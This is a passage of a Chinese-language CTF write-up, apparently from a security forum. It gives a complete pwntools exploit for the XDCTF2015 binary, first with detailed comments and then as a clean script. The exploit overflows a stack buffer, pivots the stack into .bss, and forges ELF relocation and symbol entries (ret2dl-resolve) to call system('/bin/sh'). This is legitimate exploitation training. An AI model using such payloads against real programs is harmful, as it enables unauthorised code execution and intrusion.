
```python
def getshell(fake\_Elf32\_Rel, fake\_Elf32\_Sym, esp): # esp其实是new\_esp
ebp = "DDDD" # 即刚刚栈转移后的栈顶，因为会立马pop出去，没用，所以随便写
jmp\_resolve = p32(resolve\_addr) # 即之前的jmp sub\_8049020
fake\_rel\_address = esp + rop\_size# rop\_size就按照之后的流程，提前计算一下
push\_offset = p32(fake\_rel\_address - REL\_header\_addr) # 即类似push 20h
random\_str = 'CCCC' # 经过jmp\_resolve和fake\_rel\_address后，该调用函数了，而调用函数的栈形态是：函数；返回地址；函数参数
# 所以这个AAAA就是返回地址，如果不用的话，随便写了
bin\_sh\_address = p32(esp + rop\_size + 8 + 16 + 8) # /bin/sh的地址
# 这个地址也是按照后边的流程提前计算的
system\_str = 'system\x00\x00' # 大于4个字节，小于8个字节，则需要补足8个字节
bin\_str = '/bin/sh\x00' # 正好8个字节
rop = flat(ebp, jmp\_resolve, push\_offset, random\_str, bin\_sh\_address)
# 这个jmp\_resolve和push\_offset的顺序，就是上边提到的那个“从结果出发”
# 因为ret后，eip指向了jmp\_resolve，esp=esp+4，刚好令push\_offset为栈顶
# 参与构成rop的每个数据都长4个字节，有5个，故rop\_size = 20
# 所以，接下来的fake\_rel的地址是刚开始的那个栈顶esp+rop\_size
# 接下来就是放入fake
payload = rop + fake\_Elf32\_Rel + fake\_Elf32\_Sym + system\_str.encode() + bin\_str.encode()
return payload
# 在计算sym的偏移的时候，有用到除法，在计算除法中，有用到stack\_size即栈大小，所以
# 下边这个函数以控制栈大小来保证整除
def cacl\_stack\_size(fake\_sym\_addr, elf\_bss):
if (fake\_sym\_addr - SYM\_header\_addr) % SYM\_size == 0:
return -1
temp = ((fake\_sym\_addr - SYM\_header\_addr) // SYM\_size) + 1
fake\_sym\_addr = SYM\_size \* temp + SYM\_header\_addr
# fake\_sym\_addr = base\_stage - rop\_size + rop\_size + 8--> base\_stage + 8
base\_stage = fake\_sym\_addr - 8
# base\_stage = elf\_bss + stack\_size
return base\_stage - elf\_bss
stack\_size = 0x834 # 随便写的，反正如果不对的话，cacl\_stack\_size会对他进行调整的
bss\_addr = 0 # .bss，动态获取的
base\_stage = 0 # 这个地址就是stack\_size + bass\_addr的结果，保存一下
rop\_size = 20 # 提前算好的
leave\_ret\_addr = 0x08049105 # leave; ret;
resolve\_addr = 0x08049020 # jmp sub\_xxx
REL\_header\_addr = 0x08048380 # 注意区分两个两个Rel头部
SYM\_header\_addr = 0x0804820C
SYM\_size = 16 # 即一个sym表的大小为16个字节
STR\_header\_addr = 0x080482AC # ELF String Table，这些地址，根据IDA找找就行
read\_plt = 0 # 动态获取的
if \_\_name\_\_ == '\_\_main\_\_':
context(os='linux', arch='i386', log\_level='debug')
p = process("./main\_8\_3.out")
elf = ELF("./main\_8\_3.out")
bss\_addr = elf.bss() # bss地址
base\_stage = bss\_addr + stack\_size
fake\_sym\_addr = base\_stage - rop\_size + rop\_size + 8 # 也是提前计算，用于在calc\_stack\_size中调整stack\_size
res = cacl\_stack\_size(fake\_sym\_addr, bss\_addr)
if res!=-1:
stack\_size=res
base\_stage = bss\_addr + stack\_size
read\_plt = elf.plt['read'] # rea新d\_plt地址
new\_esp = base\_stage - rop\_size # 字面含义
payload = stack\_trans(base\_stage-rop\_size, new\_esp)
p.recvuntil("Welcome to XDCTF2015~!\n")
p.send(payload) # 栈转移结束
# 在getshell函数中的“system”，提前计算地址
system\_addr = new\_esp + rop\_size + 8 + 16
r\_offset = 0x804C010 # 根据IDA在rel.plt中随便找了一个，这个字段在函数执行一次后会保存函数的真实地址，但是目前没什么用，所以无所谓
fake\_sym\_addr = new\_esp + rop\_size + 8
# 就是在这里，如果不进行calc\_stack\_size的话，可能会出现类型错误
r\_info = (((fake\_sym\_addr - SYM\_header\_addr)//SYM\_size)<<8) + 7 # 位移，也是下标
fake\_rel = fake\_Rel(r\_offset, r\_info)
st\_name = system\_addr - STR\_header\_addr #其他的值照着IDA里抄就完事了，都是选定的值
st\_value = 0
st\_size = 0
st\_info = 0x12
st\_other = 0
st\_shndx = 0
fake\_sym = fake\_Sym(st\_name, st\_value, st\_size, st\_info, st\_other, st\_shndx)
payload = getshell(fake\_rel,fake\_sym, new\_esp)
p.send(payload)
p.interactive()
# 测试栈转移
# payload = verify\_trans(new\_esp, elf)
# p.send(payload)
# bin\_str = r.recv()
# print(f"bin\_str:{bin\_str}")
# 测试伪造是否成功
# payload = getshell\_1(new\_esp)
# p.send(payload)
# bin\_str = r.recv()
# print(f"bin\_str:{bin\_str}")
```

结果如下：

![](upload/attach/202308/950095\_9GHZ4DS87BNUDW2.png)

完整的，不带注释的代码如下

```python
from pwn import \*
stack\_size = 0x834
bss\_addr = 0
base\_stage = 0
rop\_size = 20
leave\_ret\_addr = 0x08049105
resolve\_addr = 0x08049020
REL\_header\_addr = 0x08048380
SYM\_header\_addr = 0x0804820C
SYM\_size = 16
STR\_header\_addr = 0x080482AC
read\_plt = 0
def stack\_trans(read\_start\_addr, new\_esp):
over\_buffer = 'A' \* 108
overwrite\_ebp = p32(new\_esp)
call\_read = read\_plt
ret = leave\_ret\_addr
arg\_1 = p32(0)
arg\_2 = p32(read\_start\_addr)
arg\_3 = p32(0x100)
payload = flat(over\_buffer, overwrite\_ebp, call\_read, ret, arg\_1, arg\_2, arg\_3)
fill = 'B' \* (0x100 - len(payload))
payload += flat(fill)
return payload
def verify\_trans(esp, elf):
rop\_size = 24
ebp = "DDDD"
write\_plt = elf.plt['write']
jmp\_write = p32(write\_plt)
gap = "EEEE"
arg\_1 = p32(1)
arg\_2 = p32(esp + rop\_size)
arg\_3 = p32(len("/bin/sh\00"))
bin\_str = "/bin/sh\00"
payload = flat(ebp, jmp\_write, gap, arg\_1, arg\_2, arg\_3, bin\_str)
return payload
def fake\_Rel(r\_offset, r\_info):
fake\_Elf32\_Rel = p32(r\_offset)
fake\_Elf32\_Rel += p32(r\_info)
return fake\_Elf32\_Rel
pass
def fake\_Sym(st\_name, st\_value, st\_size, st\_info, st\_other, st\_shndx):
fake\_Elf32\_Sym = p32(st\_name) # 也就这个st\_name重要
fake\_Elf32\_Sym += p32(st\_value) # 其他的是选值，从IDA中抄就完事了
fake\_Elf32\_Sym += p32(st\_size)
fake\_Elf32\_Sym += bytes([st\_info]) + bytes([st\_other]) + p16(st\_shndx)
return fake\_Elf32\_Sym
def write\_rel():
r\_offset = 0x804C010
r\_info = 0x607
rel = fake\_Rel(r\_offset, r\_info)
return rel
def write\_sym():
st\_name = 0x080482EE - 0x080482AC
st\_value = 0
st\_size = 0
st\_info = 0x12
st\_other = 0
st\_shndx = 0
sym = fake\_Sym(st\_name, st\_value, st\_size, st\_info, st\_other, st\_shndx)
return sym
def getshell\_1(esp):
rel = write\_rel()
sym = write\_sym()
ebp = "DDDD"
jmp\_resolve = p32(resolve\_addr)
fake\_rel\_address = esp + rop\_size
push\_offset = p32(fake\_rel\_address - REL\_header\_addr)
random\_str = 'CCCC'
arg\_1 = p32(1)
arg\_2 = p32(esp + rop\_size + 8 + 16 + 4)
arg\_3 = p32(8)
rubbish = 'EEEE'
bin\_str = '/bin/sh\00'
rop = flat(ebp, jmp\_resolve, push\_offset, random\_str, arg\_1, arg\_2, arg\_3)
payload = rop + rel + sym + rubbish.encode() + bin\_str.encode()
return payload
def getshell(fake\_Elf32\_Rel, fake\_Elf32\_Sym, esp):
ebp = "DDDD"
jmp\_resolve = p32(resolve\_addr)
fake\_rel\_address = esp + rop\_size
push\_offset = p32(fake\_rel\_address - REL\_header\_addr)
random\_str = 'CCCC'
bin\_sh\_address = p32(esp + rop\_size + 8 + 16 + 8)
system\_str = 'system\x00\x00'
bin\_str = '/bin/sh\x00'
rop = flat(ebp, jmp\_resolve, push\_offset, random\_str, bin\_sh\_address)
payload = rop + fake\_Elf32\_Rel + fake\_Elf32\_Sym + system\_str.encode() + bin\_str.encode()
return payload
def cacl\_stack\_size(fake\_sym\_addr, elf\_bss):
if (fake\_sym\_addr - SYM\_header\_addr) % SYM\_size == 0:
return -1
temp = ((fake\_sym\_addr - SYM\_header\_addr) // SYM\_size) + 1
fake\_sym\_addr = SYM\_size \* temp + SYM\_header\_addr
base\_stage = fake\_sym\_addr - 8
return base\_stage - elf\_bss
if \_\_name\_\_ == '\_\_main\_\_':
context(os='linux', arch='i386', log\_level='debug')
p = process("./main\_8\_3.out")
elf = ELF("./main\_8\_3.out")
bss\_addr = elf.bss()
base\_stage = bss\_addr + stack\_size
fake\_sym\_addr = base\_stage - rop\_size + rop\_size + 8
res = cacl\_stack\_size(fake\_sym\_addr, bss\_addr)
if res != -1:
stack\_size = res
base\_stage = bss\_addr + stack\_size
read\_plt = elf.plt['read']
new\_esp = base\_stage - rop\_size
payload = stack\_trans(base\_stage - rop\_size, new\_esp)
p.recvuntil("Welcome to XDCTF2015~!\n")
p.send(payload)
system\_addr = new\_esp + rop\_size + 8 + 16
r\_offset = 0x804C010
fake\_sym\_addr = new\_esp + rop\_size + 8
r\_info = (((fake\_sym\_addr - SYM\_header\_addr) // SYM\_size) << 8) + 7
fake\_rel = fake\_Rel(r\_offset, r\_info)
st\_name = system\_addr - STR\_header\_addr
st\_value = 0
st\_size = 0
st\_info = 0x12
st\_other = 0
st\_shndx = 0
fake\_sym = fake\_Sym(st\_name, st\_value, st\_size, st\_info, st\_other, st\_shndx)
payload = getshell(fake\_rel, fake\_sym, new\_esp)
p.send(payload)
p.interactive()
```

> 文章主要参考了[看雪](https://bbs.kanxue.com/thread-227034.htm)

> 我在文章“[ELF文件格式](https://bbs.kanxue.com/elink@011K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4c8Q4x3X3g2U0M7$3c8F1i4K6u0W2j5$3&6Q4x3V1k6@1b7g2N6^5k6H3`.`.)”中提到了下问中涉及到的内容
